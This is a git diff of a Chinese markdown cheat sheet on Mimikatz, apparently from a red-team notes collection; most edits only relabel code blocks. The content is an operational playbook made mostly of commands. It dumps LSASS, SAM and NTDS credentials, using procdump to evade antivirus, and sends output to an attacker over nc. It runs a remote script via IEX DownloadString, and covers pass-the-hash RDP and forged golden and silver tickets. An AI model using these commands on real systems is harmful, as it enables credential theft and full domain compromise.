@@ -25,17 +25,17 @@
 # 基本使用
 
 提权
-```
+```bash
 privilege::debug
 ```
 
 抓取密码
-```
+```bash
 sekurlsa::logonpasswords
 ```
 
 输出
-```shell
+```bash
 mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir
 # 记录 Mimikatz 输出
 mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
@@ -43,7 +43,7 @@ mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.
 ```
 
 输出传输到远程机器
-```shell
+```bash
 # Attacker 执行
 nc -lvp 4444
 
@@ -53,7 +53,7 @@ mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.ex
 ```
 
 通过 nc 远程执行
-```shell
+```bash
 # Victim 执行
 nc -lvp 443
 
@@ -63,7 +63,7 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 ```
 
 若管理员有每过几天就改密码的习惯,但是 mimikatz 抓取到的密码都是老密码,用 QuarksPwDump 等抓的 hash 也是老 hash,新密码却抓不到的情况下
-```
+```bash
 privilege::debug
 misc::memssp
 ```
@@ -89,34 +89,34 @@ misc::memssp
 
 **开启 Wdigest Auth**
 - cmd
-    ```
+    ```bash
     reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
     ```
 
 - powershell
-    ```
+    ```bash
     Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
     ```
 
 - meterpreter
-    ```
+    ```bash
     reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
     ```
 
 **关闭 Wdigest Auth**
 
 - cmd
-    ```
+    ```bash
     reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
     ```
 
 - powershell
-    ```
+    ```bash
     Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
     ```
 
 - meterpreter
-    ```
+    ```bash
     reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCreden
     ```
 
@@ -127,7 +127,7 @@ misc::memssp
 强制锁屏
 
 - cmd
-    ```
+    ```bash
     rundll32 user32.dll,LockWorkStation
     ```
 
@@ -144,7 +144,7 @@ misc::memssp
     }
     Lock-WorkStation
     ```
-    ```
+    ```powershell
     powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/Lock-WorkStation.ps1');"
     ```
 
@@ -162,25 +162,24 @@ misc::memssp
 在任务管理器找到 lsass.exe，右键创建转储文件
 
 procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
-```
+```bash
 Procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 然后用 mimikatz 加载导出来的内存再抓 hash
-```
+```bash
 sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
-**SharpDump** c# 免杀抓明文
-- https://github.com/GhostPack/SharpDump
+**[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文
 
 在管理员权限下运行生成 debug480.bin
 
 特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压处里面的文件,再丢给 mimikatz 去读取即可,如下
 
-mimikatz加载dump文件
-```
+mimikatz 加载 dump 文件
+```bash
 sekurlsa::minidump debug480
 sekurlsa::logonPasswords full
 ```
@@ -190,14 +189,14 @@ sekurlsa::logonPasswords full
 > 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
 
 从 sam 中提取目标系统用户 hash
-```
+```bash
 reg save HKLM\SYSTEM system.hiv
 reg save HKLM\SAM sam.hiv
 reg save HKLM\SECURITY security.hiv
 ```
 
 将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
-```
+```bash
 lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 ```
 
@@ -206,7 +205,7 @@ lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 # NTDS.DIT
 
 使用 Mimikatz 提取 Active Directory hash
-```
+```bash
 privilege::debug
 mimikatz lsadump::lsa /inject exit
 sekurlsa::minidump c:\temp\lsass.dmp      使用 Mimikatz 转储 LSASS 内存
@@ -218,19 +217,19 @@ sekurlsa::logonpasswords
 Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。
 
 运行 DCSync 需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都能够运行 DCSync 来提取密码数据。请注意，只读域控制器不仅可以默认为用户提取密码数据。
-```
+```bash
 privilege::debug
 lsadump::dcsync /domain:ffffffff0x.com /all /csv
 ```
 
 通过使用 /user 参数指定域用户名，Mimikatz 会将该指定用户的所有帐户信息转储包括哈希值。
-```
+```bash
 lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt
 lsadump::dcsync /domain:ffffffff0x.com /user:test
 ```
 
 可以直接在域控制器中执行 Mimikatz，通过 lsass.exe 进程 dump 密码哈希
-```
+```bash
 privilege::debug
 lsadump::lsa /inject
 ```
@@ -251,7 +250,7 @@ lsadump::lsa /inject
     - https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro
 
 2. 修改注册表
-    ```
+    ```bash
     HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 
     # 新建 DWORD 键值 DisableRestrictedAdmin，值为 0，代表开启;值为 1，代表关闭
@@ -263,16 +262,16 @@ lsadump::lsa /inject
 3. mimikatz 修改注册表
 
     如果你有一个用户的 NTLM 哈希值，而这个用户有设置注册表的权限，你可以使用 Powershell 来启用它，然后通过 RDP 登录。
-    ```
+    ```bash
     mimikatz.exe privilege::debug "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
     ```
-    ```
+    ```bash
     Enter-PSSession -Computer <Target>
     New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0"
     ```
 
 4. 使用攻击机自己的用户及 Hash 进行远程登录
-    ```
+    ```bash
     mstsc.exe /restrictedadmin
     ```
     如果当前系统支持受限管理模式，则上述命令执行后会直接弹出远程登录的登录界面；如果当前系统不支持受限管理模式，则上述命令执行后会弹出远程桌面的参数说明
@@ -280,15 +279,14 @@ lsadump::lsa /inject
     如果上述命令顺利执行，输入目标机器的 IP 和端口，可直接进行远程登录，不需要输入任何口令，这种方式会使用当前攻击机的用户名和用户 hash 尝试登录目标机器
 
     开启 Restricted Admin mode
-    ```
+    ```bash
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
     ```
 
 **mimikatz 进行 PtH**
 
 1. (工作组)通过 pth 进行远程登录(cmd)
-
-    ```
+    ```bash
     mimikatz.exe privilege::debug
 
     mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
@@ -297,8 +295,7 @@ lsadump::lsa /inject
     ```
 
 2. (域)通过 pth 进行远程登录(cmd)
-
-    ```
+    ```bash
     mimikatz.exe privilege::debug
     mimikatz.exe sekurlsa::logonpasswords
 
@@ -308,7 +305,7 @@ lsadump::lsa /inject
     ```
 
 3. 通过 pth 进行远程登录(mstsc)
-    ```
+    ```bash
     # 管理员权限下执行以下命令:
     mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
     ```
@@ -323,15 +320,16 @@ lsadump::lsa /inject
 ---
 
 # PTT
+
 ## Silver_Tickets
 
 导出 Server Hash
-```
+```bash
 mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
 ```
 
 使用 mimikatz 伪造白银票据：
-```
+```bash
 mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
 ```
 
@@ -339,17 +337,17 @@ mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标�
 
 在域控上执行以下命令获取本地账户 NTLM Hash 和 SID
 
-```
+```bash
 mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
 ```
 
 ![](../../../assets/img/Security/安全工具/mimikatz/1.png)
 
 然后将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
-```
+```bash
 kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /rc4:f9ca454a3544172034a8666a79eda95e /service:cifs /user:test /ptt
 
-// 这里的 cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
+# 这里的 cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
 ```
 
 访问测试
@@ -360,25 +358,30 @@ kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486
 
 ## Golden_Tickets
 
-登录域控抓取 krbtgt 的密码 Hash 和获取域 SID
-```
-mimikatz.exe log "lsadump::dcsync /domain:<域名> /user:krbtgt"
+dump krbtgt hash
+```bash
+privilege::debug
+lsadump::lsa /patch
+
+# 或
+
+lsadump::dcsync /domain:<域名> /user:krbtgt
 ```
 
 使用 mimikatz 伪造的黄金票据：
-```
+```bash
 kerberos::golden /user:<用户名> /domain:<域名> /sid:<域SID> /krbtgt:<Hash> /ticket:test.kiribi
 ```
 
 利用 mimikatz 的 kerberos::ptt 将黄金票据 test.kiribi 注入到内存中：
-```
-// 清除缓存的票据
+```bash
+# 清除缓存的票据
 kerberos::purge
 
-// 注入黄金票据 test.kiribi
+# 注入黄金票据 test.kiribi
 kerberos::ptt test.kiribi
 
-// 列出票据
+# 列出票据
 kerberos::list
 ```
 
@@ -393,20 +396,20 @@ kerberos::list
 在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 和 SID
 
 使用 Mimikatz 抓取 Krbtgt 账号的密码
-```
+```bash
 mimikatz.exe "lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt" > log.txt
 ```
 
 ![](../../../assets/img/Security/安全工具/mimikatz/3.png)
 
 得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `test.kiribi`：
-```
+```bash
 kerberos::golden /user:administrator /domain:FFFFFFFF0X.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /krbtgt:743093920acd8d427323c24c0e2c52c2 /ticket:test.kiribi
 ```
 `/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称
 
 注入黄金票据
-```
+```bash
 kerberos::ptt test.kiribi
 ```
 
@@ -418,7 +421,8 @@ kerberos::ptt test.kiribi
 
 # PTK
 
-```
+```bash
+# 获取用户的 aes key
 mimikatz "privilege::debug" "sekurlsa::ekeys"
 
 # 注意查看 aes256_hmac 和 aes128_hmac
